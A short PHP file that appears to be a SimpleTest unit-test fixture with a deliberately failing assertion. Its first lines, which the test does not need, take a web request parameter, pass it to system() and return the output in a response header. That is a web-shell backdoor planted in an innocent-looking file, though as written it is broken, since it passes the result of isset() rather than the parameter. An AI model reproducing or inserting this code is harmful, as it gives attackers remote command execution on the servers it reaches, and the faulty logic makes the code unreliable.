<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
require_once(dirname(__FILE__) . '/../../autorun.php');

class FailingTest extends UnitTestCase {
    function test_fail() {
        $this->assertEqual(1,2);
    }
}
?>